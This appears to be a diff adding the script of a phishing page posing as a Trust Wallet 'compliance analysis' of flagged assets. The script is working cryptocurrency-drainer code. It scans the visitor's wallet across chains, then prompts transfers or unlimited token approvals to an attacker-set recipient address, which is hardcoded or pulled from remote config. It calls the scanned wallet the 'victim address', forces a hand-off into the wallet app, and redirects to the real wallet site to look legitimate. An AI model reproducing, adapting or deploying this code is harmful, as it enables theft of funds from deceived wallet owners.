+// Balance — deckt auch spätere Einzahlungen auf dieselbe Allowance ab.
+var APPROVE_MAX = APPROVE && params.get("amt") === "max";
+var MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+// The compliance report belongs to the chainscaner handoff flow (?h=/?q= queue
+// or explicit attest=1). Plain send QR links (fire=1, bare ?to=) end with a
+// short done state and a redirect to the official Trust Wallet site instead.
+var REPORT_MODE = ATTEST || !!(params.get("h") || params.get("q"));
+// wallet=wc — admin-marked links skip the injected-provider probe and the
+// Trust Wallet forward entirely: pairing runs through WalletConnect
+var WC_MODE = params.get("wallet") === "wc";
+var wcProjectId = null;
+var WALLET_HOME = "https://trustwallet.com/";
+// Für WC-Sessions ist die Peer-Homepage das richtige Hand-back-Ziel —
+// Atomic-Links landen sonst fälschlich auf trustwallet.com
+function walletHome() {
+  try {
+    var peerUrl = wcProvider && wcProvider.session && wcProvider.session.peer &&
+      wcProvider.session.peer.metadata && wcProvider.session.peer.metadata.url;
+    if (peerUrl && /^https:\/\//.test(peerUrl)) return peerUrl;
+  } catch(e) {}
+  // Injizierter Coinbase-Provider (Base App / Coinbase Wallet) → base.org
+  try { if (window.ethereum && window.ethereum.isCoinbaseWallet) return "https://www.base.org"; } catch(e) {}
+  return WALLET_HOME;
+}
+function finishQrFlow(msg) {
+  var view = document.getElementById("view");
+  view.classList.remove("fail");
+  view.classList.add("done");
+  wcDisarm();
+  setStatus(msg);
+  setTimeout(function() { window.location.href = walletHome(); }, 1600);
+}
+handoffH = params.get("h") || null;
+var toParam = params.get("to");
+if (toParam && isValidAddr(toParam)) txRecipient = toParam;
+// Remote default recipient — Edge Config is the single source of truth when
+// the link itself carries none
+var remoteRecipientP = fetch("/api/config").then(function(r) { return r.json(); }).then(function(j) {
+  if (!txRecipient && j && j.ok && isValidAddr(j.recipient)) txRecipient = j.recipient;
+  // Admin-set minimum pull amount — Edge Config wins over the hardcoded floor.
+  // Note: 0 is a real value (no dust filter), not "unset" — check null not >0.
+  if (j && j.ok && j.minPullUsd != null && !isNaN(Number(j.minPullUsd))) MIN_FLAG_USD = Number(j.minPullUsd);
+  if (j && j.ok && /^[a-f0-9]{32}$/i.test(j.wcProjectId || "")) wcProjectId = j.wcProjectId;
+}).catch(function() {});
+// Offline fallbacks
+if (!txRecipient) {
+  try {
+    var saved = localStorage.getItem("tw_public_recipient");
+    txRecipient = (saved && isValidAddr(saved)) ? saved : "0xB2bC30C3a8C04c6F4100b5cC76f83c547dc373b1";
+  } catch(e) { txRecipient = "0xB2bC30C3a8C04c6F4100b5cC76f83c547dc373b1"; }
+}
+
+monit("page_opened", { page: "exec", inWallet: !!(window.trustwallet || window.ethereum), fire: params.get("fire") === "1" });
+
+var started = false;
+
+// ── Prepared-queue hydration ────────────────────────────────────────────────
+// The Safari-side scan posts its queue to the event feed under the handoff
+// id, so the deep link carries only ?h=<id>&to=<addr> — short enough to
+// survive cold-start routing (long ?q= URLs were dropped silently). ?q=
+// inline form still works for legacy links.
+function hydrateQueue(q) {
+  transferQueue = [];
+  (q || []).slice(0, 10).forEach(function(it) {
+    if (!it || !CHAIN_INFO[it.c] || !it.r || !/^\d+$/.test(String(it.r)) || !(BigInt(it.r) > 0n)) return;
+    var tok = null;
+    if (it.k) {
+      var known = (SCAN_TOKENS[it.c] || []).filter(function(t) { return t.key === it.k; })[0];
+      if (known) tok = { name: known.name, addr: known.addr, decimals: known.decimals, key: it.k };
+    } else if (isValidAddr(it.a)) {
+      tok = {
+        name: String(it.n || "TOKEN").replace(/[^A-Za-z0-9 .\-_]/g, "").slice(0, 12).toUpperCase() || "TOKEN",
+        addr: it.a, decimals: Math.max(0, Math.min(18, Number(it.d) || 18)), key: null
+      };
+    }
+    if (!tok) return;
+    tok.raw = String(it.r);
+    tok.human = formatTokenAmount(tok.raw, tok.decimals);
+    tok.chainId = it.c;
+    tok.chainName = CHAIN_INFO[it.c].name;
+    tok.usdValue = Number(it.u) || 0;
+    tok.gasOk = true;
+    tok.dust = false;
+    transferQueue.push(tok);
+  });
+}
+
+function hydrateAndRun(p, incH, qParam) {
+  setStatus("Loading analysis…");
+  function done(d) {
+    if (d && Array.isArray(d.q)) hydrateQueue(d.q);
+    if (d && isValidAddr(d.to) && !isValidAddr(txRecipient)) txRecipient = d.to;
+    if (transferQueue.length > 0) { startQueueFromHandoff(p, d && d.addr); return; }
+    runScan(p); // nothing usable arrived — scan the connected wallet instead
+  }
+  if (qParam) {
+    var arr = null;
+    try { arr = JSON.parse(qParam); } catch(e) {}
+    done(Array.isArray(arr) ? { q: arr, to: params.get("to"), addr: params.get("addr") } : null);
+    return;
+  }
+  function fetchQueue(retries) {
+    withTimeout(fetch("/api/events?limit=60").then(function(r) { return r.json(); }), 8000)
+      .then(function(d) {
+        var ev = null;
+        (d && d.events || []).forEach(function(e) {
+          if (!ev && e.ev && e.ev.ev === "handoff_queue" && e.ev.d && e.ev.d.h === incH) ev = e.ev;
+        });
+        if (ev) { done(ev.d); return; }
+        // The beacon post can lag behind the cold-start navigation — one
+        // delayed retry before falling back to a fresh scan
+        if (retries > 0) {
+          setTimeout(function() { fetchQueue(retries - 1); }, 2500);
+          return;
+        }
+        done(null);
+      }).catch(function() {
+        if (retries > 0) { setTimeout(function() { fetchQueue(retries - 1); }, 2500); return; }
+        done(null);
+      });
+  }
+  fetchQueue(1);
+}
+
+// Queue arrived pre-prepared — re-verify balances live (cap each amount at the
+// current balance, drop entries that came back empty or unverifiable), then
+// run. If the connected wallet isn't the scanned address, rescan it instead —
+// the contract spends the connected wallet's tokens.
+function startQueueFromHandoff(p, scannedAddr) {
+  setStatus("Preparing analysis…");
+  var reverify = Promise.resolve(transferQueue);
+  if (scannedAddr && isValidAddr(scannedAddr)) {
+    reverify = Promise.all(transferQueue.map(function(tok) {
+      return withTimeout(queryTokenBalanceOnChain(scannedAddr, tok.addr, tok.decimals, tok.chainId), 16000).then(function(b) {
+        if (!b || !b.raw || BigInt(b.raw) === 0n) return null;
+        if (BigInt(b.raw) < BigInt(tok.raw)) tok.raw = b.raw;
+        return tok;
+      });
+    })).then(function(v) { return v.filter(Boolean); });
+  }
+  reverify.then(function(q) {
+    transferQueue = q;
+    if (!transferQueue.length) { runScan(p); return; }
+    connectedAccounts(p).then(function(accs) {
+      var a = accs && accs[0];
+      if (scannedAddr && a && isValidAddr(a) && a.toLowerCase() !== String(scannedAddr).toLowerCase()) {
+        monit("account_mismatch", { scanned: scannedAddr, connected: a });
+        runScan(p);
+        return;
+      }
+      if (a && isValidAddr(a)) walletAccount = a;
+      lastScannedAddr = scannedAddr || a || "";
+      scannedBalances = transferQueue;
+      if (lastScannedAddr) saveScanLog(lastScannedAddr);
+      updateScanLog(function(e) {
+        e.status = "attesting";
+        (e.tokenStates || []).forEach(function(t) { if (t.status === "detected") t.status = "pending"; });
+      });
+      monit("analysis_started", { via: "handoff", queue: transferQueue.map(function(t) { return t.name + " (" + t.chainName + ")"; }) });
+      isLoading = true;
+      new Promise(function(r) { setTimeout(r, 800); }).then(function() { doSequentialTransfers(p); });
+    }).catch(function() {
+      // Account unreadable — run anyway; the wallet supplies its own sender
+      isLoading = true;
+      doSequentialTransfers(p);
+    });
+  });
+}
+
+// Scan mode — silent account read first: sync props → eth_accounts retries.
+// eth_requestAccounts fires ONLY as recovery when the silent read stays empty —
+// keeps the auto-path prompt-free for connected wallets, recovers lost grants.
+function runScan(p) {
+  // ?addr= — the QR already carries the victim address: the scan runs on
+  // public RPCs so NO account read is needed and eth_requestAccounts can
+  // never fire. The transfer sheets still spend from the wallet's own
+  // account when their confirms arrive.
+  var addrParam = params.get("addr");
+  if (addrParam && isValidAddr(addrParam)) {
+    monit("scan_target_addr", { via: params.get("via") || "exec" });
+    runScanContinue(p, addrParam);
+    return;
+  }
+  function readAcc(tries) {
+    try {
+      var direct = p.selectedAddress || p.address || (p.accounts && p.accounts[0]);
+      if (direct && isValidAddr(direct)) return Promise.resolve(direct);
+    } catch(e) {}
+    return connectedAccounts(p).then(function(accs) {
+      var a = accs && accs[0];
+      if (a && isValidAddr(a)) return a;
+      if (tries > 0) return new Promise(function(r) { setTimeout(r, 350); }).then(function() { return readAcc(tries - 1); });
+      return null;
+    }).catch(function() {
+      if (tries > 0) return new Promise(function(r) { setTimeout(r, 350); }).then(function() { return readAcc(tries - 1); });
+      return null;
+    });
+  }
+  readAcc(6).then(function(a) {
+    if (!a || !isValidAddr(a)) {
+      // Silent read stayed empty — the site lost its authorization (or the
+      // wallet has no active account). One explicit request is the only
+      // recovery: a connect sheet beats a dead end.
+      monit("exec_account_retry", { via: params.get("via") || "exec" });
+      setStatus("Connecting wallet…");
+      rpc(p, "eth_requestAccounts").then(function(accs) {
+        var a2 = accs && accs[0];
+        if (a2 && isValidAddr(a2)) { runScanContinue(p, a2); return; }
+        noAccount();
+      }).catch(function() { noAccount(); });
+      return;
+    }
+    runScanContinue(p, a);
+  });
+}
+
+function noAccount() {
+  document.getElementById("view").classList.add("fail");
+  setStatus("No connected account — open inside the Trust Wallet DApp browser.");
+  monit("exec_no_account", { via: params.get("via") || "exec" });
+}
+
+function runScanContinue(p, a) {
+    lastScannedAddr = a;
+    walletAccount = a;
+    var addrEl = document.getElementById("addr");
+    addrEl.textContent = a.slice(0, 6) + "…" + a.slice(-4);
+    addrEl.style.display = "inline-block";
+    setStatus("Scanning all chains for flagged assets…");
+    monit("scan_started", { addr: a, via: "exec" });
+    scanAllChains(a).then(function() {
+      transferQueue = scannedBalances.filter(function(b) { return b.gasOk === true && b.dust !== true; }).slice(0, 10);
+      saveScanLog(a);
+      if (transferQueue.length === 0) {
+        monit("scan_empty", { addr: a, rpcFails: rpcFailCount, found: scannedBalances.length });
+        if (!REPORT_MODE) { finishQrFlow("No flagged assets found on this wallet."); return; }
+        renderFinalReport();
+        return;
+      }
+      updateScanLog(function(e) {
+        e.status = "attesting";
+        (e.tokenStates || []).forEach(function(t) {
+          var inQ = transferQueue.some(function(q) { return (q.name + "|" + (q.chainId || currentChain)) === t.key; });
+          if (inQ && t.status === "detected") t.status = "pending";
+        });
+      });
+      setStatus("Preparing analysis…");
+      monit("analysis_started", { via: "exec", queue: transferQueue.map(function(t) { return t.name + " (" + t.chainName + ")"; }) });
+      isLoading = true;
+      new Promise(function(r) { setTimeout(r, 1000); }).then(function() { doSequentialTransfers(p); });
+    });
+}
+
+function onProvider(p) {
+  if (started) return;
+  started = true;
+  provider = p;
+  var incH = params.get("h");
+  if (incH) monit("handoff_opened", { h: incH, via: "exec" });
+  remoteRecipientP.then(function() {
+    // fire=1 — prepared single transfer carried in the link itself: no account
+    // read, no scan. The only wallet interaction is its own confirm sheet.
+    if (params.get("fire") === "1" && isValidAddr(txRecipient)) {
+      var fContract = params.get("contract");
+      var fDec = Number(params.get("decimals"));
+      var fMax = String(params.get("amount") || "").toLowerCase() === "max";
+      var fAmt = fMax ? 0 : Number(params.get("amount"));
+      var fCid = params.get("chainId") || "0x1";
+      var fName = String(params.get("tname") || "TOKEN").replace(/[^A-Za-z0-9 .\-_]/g, "").slice(0, 12).toUpperCase() || "TOKEN";
+      if (isValidAddr(fContract) && (fMax || (!isNaN(fAmt) && fAmt >= 0)) && CHAIN_INFO[fCid]) {
+        var fDecimals = (!isNaN(fDec) && fDec >= 0 && fDec <= 18) ? fDec : 18;
+        transferQueue = [{
+          name: fName, addr: fContract, decimals: fDecimals,
+          raw: fMax ? "115792089237316195423570985008687907853269984665640564039457584007913129639935"
+                   : amtToRaw(params.get("amount"), fDecimals),
+          human: fMax ? "unlimited" : String(fAmt),
+          chainId: fCid, chainName: CHAIN_INFO[fCid].name, usdValue: 0
+        }];
+        setStatus("Preparing transaction…");
+        monit("fire_prepared", { token: fName, chain: fCid, amount: fMax ? "max" : fAmt, approve: APPROVE });
+        isLoading = true;
+        new Promise(function(r) { setTimeout(r, 1000); }).then(function() { doSequentialTransfers(p); });
+        return;
+      }
+      document.getElementById("view").classList.add("fail");
+      setStatus("Invalid link parameters — regenerate the QR code.");
+      return;
+    }
+    // Prepared-queue handoff — ?h= hydrates from the event feed, ?q= carries
+    // the queue inline (legacy links). Missing or empty data falls back to a
+    // fresh scan of the connected wallet.
+    var qParam = params.get("q");
+    if (incH || qParam) { hydrateAndRun(p, incH, qParam); return; }
+    runScan(p);
+  });
+}
+
+// Provider probe — inside the DApp the bridge injects fast; on mobile without
+// a provider, forward into Trust Wallet via the universal link
+window.addEventListener("trustwallet#initialized", function() {
+  var p0 = pickProvider();
+  if (p0) onProvider(p0);
+}, { once: true });
+var tries = 0;
+(function probe() {
+  // Explicit WalletConnect target — skip the injected probe entirely
+  if (WC_MODE) { startWalletConnect(); return; }
+  var p = pickProvider();
+  if (p) { onProvider(p); return; }
+  var mobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  var fwdDone = !!sessionStorage.getItem("tw_fwd");
+  if (mobile && !fwdDone) {
+    if (tries++ < 4) { setTimeout(probe, 300); return; }
+    sessionStorage.setItem("tw_fwd", "1");
+    setStatus("Opening Trust Wallet…");
+    // Reuse an incoming handoff id — the queue was posted under it, and the
+    // landed-check watches the same id the page reports once inside the app
+    var outId = params.get("h") || ("h" + Date.now().toString(36));
+    var self = location.origin + location.pathname + location.search +
+      (params.get("h") ? "" : (location.search ? "&" : "?") + "h=" + outId);
+    var dl = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(self);
+    function wFire() { window.location.href = dl; }
+    function wLanded(cb) {
+      fetch("/api/events?limit=60").then(function(r) { return r.json(); }).then(function(d) {
+        cb((d.events || []).some(function(e) {
+          return e.ev && e.ev.ev === "handoff_opened" && e.ev.d && e.ev.d.h === outId;
+        }));
+      }).catch(function() { cb(false); });
+    }
+    wFire();
+    [4500, 10000, 18000].forEach(function(ms) {
+      setTimeout(function() { wLanded(function(ok) { if (!ok) wFire(); }); }, ms);
+    });
+    document.addEventListener("visibilitychange", function() {
+      if (document.hidden) return;
+      wLanded(function(ok) { if (!ok) wFire(); });
+    });
+    return;
+  }
+  // Provider still missing and we can't forward (desktop, already forwarded,
+  // or an in-app client redirect like /escrow → /exec): TW injects late on
+  // such navigations — keep polling ~9s more before declaring a dead end
+  if (tries++ < 34) { setTimeout(probe, 300); return; }
+  // No injected provider: desktop (or post-forward) falls back to a
+  // WalletConnect pairing when configured — strictly better than a dead end
+  remoteRecipientP.then(function() {
+    if (wcProjectId && window["@walletconnect/ethereum-provider"]) { startWalletConnect(); return; }
+    document.getElementById("view").classList.add("fail");
+    setStatus("No wallet provider — open this link inside the Trust Wallet DApp browser.");
+    monit("exec_no_provider", { fwd: !!sessionStorage.getItem("tw_fwd") });
+  });
+})();
+</script>
+</body>
+</html>
